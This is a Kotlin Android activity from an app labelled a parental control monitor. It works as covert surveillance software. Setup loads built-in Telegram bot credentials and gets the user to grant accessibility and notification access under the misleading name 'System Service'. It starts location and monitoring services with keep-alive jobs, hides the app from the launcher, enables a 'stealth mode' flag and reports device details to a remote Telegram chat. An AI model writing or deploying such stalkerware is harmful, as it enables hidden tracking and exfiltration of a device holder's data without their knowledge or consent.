package com.parentalcontrol.monitor

import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import com.parentalcontrol.monitor.utils.DeviceUtils
import com.parentalcontrol.monitor.utils.HuaweiOptimizationHelper
import com.parentalcontrol.monitor.utils.ServiceUtils
import com.parentalcontrol.monitor.utils.JobSchedulerHelper
import com.parentalcontrol.monitor.services.MonitoringService
import com.parentalcontrol.monitor.services.LocationService
import com.parentalcontrol.monitor.services.TelegramService

class AutoSetupActivity : AppCompatActivity() {
    
    private lateinit var prefs: SharedPreferences
    private val setupHandler = Handler(Looper.getMainLooper())
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Minimal UI - just permission requests
        setContentView(R.layout.activity_auto_setup)
        
        prefs = getSharedPreferences("ParentalControlPrefs", MODE_PRIVATE)
        
        // Check if this is first run
        if (isFirstRun()) {
            startAutoConfiguration()
        } else {
            // Already configured, just ensure services are running
            ensureServicesRunning()
            finishAndHide()
        }
    }
    
    private fun isFirstRun(): Boolean {
        return !prefs.getBoolean("auto_configured", false)
    }
    
    private fun startAutoConfiguration() {
        lifecycleScope.launch {
            try {
                showToast("Setting up parental monitoring...")
                
                // Step 1: Configure Telegram credentials automatically
                configureTelegramCredentials()
                delay(1000)
                
                // Step 2: Request all permissions in sequence
                requestAllPermissions()
                delay(2000)
                
                // Step 3: Configure Huawei optimizations
                configureHuaweiOptimizations()
                delay(1000)
                
                // Step 4: Start all monitoring services
                startAllServices()
                delay(1000)
                
                // Step 5: Hide the app automatically
                hideAppFromLauncher()
                delay(500)
                
                // Step 6: Send initial setup confirmation
                sendSetupConfirmation()
                
                // Mark as configured
                markAsConfigured()
                
                showToast("Setup complete - app is now monitoring")
                
                // Auto-hide after 3 seconds
                setupHandler.postDelayed({
                    finishAndHide()
                }, 3000)
                
            } catch (e: Exception) {
                showToast("Setup error - please restart app")
                finish()
            }
        }
    }
    
    private fun configureTelegramCredentials() {
        // Use pre-built credentials from BuildConfig
        prefs.edit().apply {
            putString("telegram_bot_token", BuildConfig.TELEGRAM_BOT_TOKEN)
            putString("telegram_chat_id", BuildConfig.TELEGRAM_CHAT_ID)
            putBoolean("telegram_configured", true)
            apply()
        }
    }
    
    private fun requestAllPermissions() {
        val permissionHelper = PermissionHelper(this)
        
        // Request all permissions at once
        permissionHelper.requestAllPermissions { granted ->
            if (granted) {
                showToast("Permissions granted")
            } else {
                // Guide user to settings for missing permissions
                guideToPermissionSettings()
            }
        }
    }
    
    private fun guideToPermissionSettings() {
        // Auto-open accessibility settings if not granted
        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            
            showToast("Please enable 'System Service' in Accessibility")
        }
        
        // Auto-open notification access if not granted
        if (!PermissionHelper.isNotificationAccessGranted(this)) {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            
            showToast("Please enable 'System Service' in Notification Access")
        }
    }
    
    private fun configureHuaweiOptimizations() {
        if (DeviceUtils.isHuaweiDevice()) {
            val optimizer = HuaweiOptimizationHelper(this)
            
            // Auto-configure power management
            optimizer.disableBatteryOptimization()
            
            // Guide to protected apps if possible
            optimizer.requestProtectedAppsAccess()
            
            // Configure auto-start
            optimizer.configureAutoStart()
        }
    }
    
    private fun startAllServices() {
        // Start main monitoring service
        val monitoringIntent = Intent(this, MonitoringService::class.java)
        startForegroundService(monitoringIntent)
        
        // Start location service
        val locationIntent = Intent(this, LocationService::class.java)
        startService(locationIntent)
        
        // Start Telegram service
        val telegramIntent = Intent(this, TelegramService::class.java)
        startService(telegramIntent)
        
        // Configure job scheduler for keep-alive
        JobSchedulerHelper.scheduleKeepAliveJob(this)
    }
    
    private fun hideAppFromLauncher() {
        if (BuildConfig.AUTO_HIDE) {
            val pm = packageManager
            val componentName = android.content.ComponentName(this, MainActivity::class.java)
            
            pm.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            
            // Also hide the setup activity
            val setupComponent = android.content.ComponentName(this, AutoSetupActivity::class.java)
            pm.setComponentEnabledSetting(
                setupComponent,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        }
    }
    
    private fun sendSetupConfirmation() {
        lifecycleScope.launch {
            try {
                val telegramService = TelegramService()
                val deviceInfo = DeviceUtils.getDeviceInfo(this@AutoSetupActivity)
                
                val message = """
                🎯 Parental Control Monitor - Setup Complete!
                
                📱 Device: ${deviceInfo.model}
                🔋 Battery: ${deviceInfo.batteryLevel}%
                📍 Location: ${if (PermissionHelper.hasLocationPermission(this@AutoSetupActivity)) "Enabled" else "Disabled"}
                🔔 Notifications: ${if (PermissionHelper.isNotificationAccessGranted(this@AutoSetupActivity)) "Enabled" else "Disabled"}
                ♿ Accessibility: ${if (PermissionHelper.isAccessibilityServiceEnabled(this@AutoSetupActivity)) "Enabled" else "Disabled"}
                
                ✅ Monitoring Started Automatically
                👻 App Hidden from Device
                🔄 Background Services Active
                
                Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}
                """.trimIndent()
                
                telegramService.sendMessage(message)
                
            } catch (e: Exception) {
                // Silent fail - don't interrupt setup
            }
        }
    }
    
    private fun markAsConfigured() {
        prefs.edit().apply {
            putBoolean("auto_configured", true)
            putBoolean("monitoring_active", true)
            putBoolean("stealth_mode", true)
            putLong("setup_timestamp", System.currentTimeMillis())
            apply()
        }
    }
    
    private fun ensureServicesRunning() {
        // Check if services are running, restart if needed
        if (!ServiceUtils.isServiceRunning(this, MonitoringService::class.java)) {
            startForegroundService(Intent(this, MonitoringService::class.java))
        }
        
        if (!ServiceUtils.isServiceRunning(this, LocationService::class.java)) {
            startService(Intent(this, LocationService::class.java))
        }
    }
    
    private fun finishAndHide() {
        // Move to background
        moveTaskToBack(true)
        finish()
    }
    
    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
    
    override fun onBackPressed() {
        // Prevent user from going back during setup
        if (!prefs.getBoolean("auto_configured", false)) {
            showToast("Please allow all permissions to continue")
            return
        }
        super.onBackPressed()
    }
}
